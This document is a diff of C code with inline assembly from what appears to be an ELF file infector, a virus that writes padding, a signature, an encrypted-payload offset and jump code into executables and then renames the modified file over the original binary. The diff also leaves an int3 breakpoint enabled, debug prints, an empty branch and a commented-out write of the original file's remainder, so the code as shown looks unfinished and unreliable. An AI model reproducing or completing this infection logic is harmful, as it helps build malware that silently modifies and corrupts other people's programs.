@@ -15,7 +15,7 @@
 # include <stdio.h> // DELL printfs
 #include <stdio.h>
 # define SIZE_BEFORE_ENTRY_POINT (62 + 2 * sizeof(size_t))
-# define BONUS 1
+# define BONUS 0
 
 typedef struct	s_file
 {
@@ -139,7 +139,7 @@ int _start()
 {
 	__asm__(".globl real_start\n"
 	        "real_start:\n"
-	//"int3\n"
+		// "int3\n"
             "pushq %rax\n"
 			"pushq %rax\n"
 	        "pushq %rbx\n"
@@ -160,7 +160,7 @@ int _start()
 			"pushq %r15\n"
 
 		    "call do_main\n"
-	      //  "int3\n"
+	        "int3\n"
 	        "jmp myend\n");
 
 }
@@ -728,7 +728,7 @@ size_t padding_before = 0;
 		}
 		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)) {
 
-            padding_before = phdr[i + 1].p_vaddr + phdr[i + 1].p_filesz - phdr[i].p_vaddr + phdr[i].p_filesz + 0x1000;
+            padding_before = phdr[i + 1].p_vaddr + phdr[i + 1].p_filesz - phdr[i].p_vaddr + phdr[i].p_filesz+ PAGE_SIZE;
 
 			//puts("text found");
 			text_end = phdr[i].p_offset + phdr[i].p_filesz;
@@ -836,8 +836,20 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	unsigned long address_of_start_encrypt = get_eip() - ((char *)&yeah - (char *)&main_encrypt);
 	size_t size_wrote = 0;
 	size_t	value;
-	for (size_t j = 0; j<  padding;j++)
-		write(fd,"\0",1);
+	if (size < end_of_text + padding)
+	{
+		ft_putstr("plus petit\n");
+		size_t padding_wrote = 0;
+		padding_wrote = write(fd,buf + end_of_text, size - end_of_text);
+		while(padding_wrote++ < padding) {
+			write(fd,"\0",1);
+		}
+	}
+	else
+		for (size_t j = 0; j<  padding;j++)
+			write(fd,"\0",1);
+
+
 	size_wrote =	put_sig(fd, n_loaded);
 	value = (address_of_start_encrypt - address_of_start);
 	size_wrote += write(fd, (char *)(&value), sizeof(size_t));
@@ -849,10 +861,15 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 
 	size_wrote += write(fd,jmp_code,9);
 
-	for (long unsigned int i = 0; i< PAGE_SIZE - size_wrote ;i++)
-		write(fd,"\j",1);
+	if (size <end_of_text + padding)
+	{
 
-	write(fd,buf + end_of_text, size - end_of_text);
+	}
+	ft_putnbr(PAGE_SIZE - size_wrote);
+//	for (long unsigned int i = 0; i< PAGE_SIZE*2 - size_wrote ;i++)
+//		write(fd,"\j",1);
+ft_putstr("ok\n");
+	//write(fd,buf + end_of_text, size - end_of_text);
 
 	//lseek(fd, end_of_text, SEEK_SET);
 
@@ -865,7 +882,6 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	close(fd);
 	unlink(path);
 	rename (tmp, path);
-
 }
 
 int             ft_strncmp(const char *s1, const char *s2, size_t n)
